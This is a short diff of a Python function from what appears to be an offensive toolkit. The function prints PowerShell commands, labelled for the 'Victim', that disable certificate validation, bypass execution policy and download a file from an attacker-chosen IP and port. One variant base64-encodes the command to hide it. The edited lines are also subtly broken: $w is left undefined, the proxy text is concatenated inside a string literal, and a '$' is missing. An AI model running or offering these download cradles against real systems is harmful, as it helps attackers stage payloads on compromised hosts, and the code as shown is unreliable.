@@ -108,7 +108,7 @@ def powershell(ip,port,file,proxy,creds):
     else:
         wproxy = "$w = New-Object System.Net.WebClient;if([System.Net.WebProxy]::GetDefaultProxy().address -ne $null){$w.proxy=[Net.WebRequest]::GetSystemWebProxy();w.Proxy.Credentials=[Net.CredentialCache]::DefaultCredentials;};"
     print("\033[94mDownload a file\033[0m")
-    print("\033[38;5;208mVictim:\033[0m powershell -nop -exec bypass -C [System.Net.ServicePointManager]::ServerCertificateValidationCallback={$true};"+wproxy+" $w.DownloadFile('http://"+ip+":"+port+"/"+file+"','"+file+"')\n")
+    print("\033[38;5;208mVictim:\033[0m powershell -nop -exec bypass -C [System.Net.ServicePointManager]::ServerCertificateValidationCallback={$true}; $w.DownloadFile('http://"+ip+":"+port+"/"+file+"','"+file+"')\n")
     print("\033[38;5;208mVictim:\033[0m powershell -nop -exec bypass -e " + base64.b64encode('[System.Net.ServicePointManager]::ServerCertificateValidationCallback={$true};"+wproxy+"$w.DownloadFile(\'http://"+ip+":"+port+"/"+file+"\',\'"+file+"\')'.encode('UTF-16LE')).decode() + "\n")
     
     print("\033[94mDownload a file in AppData%\033[0m")
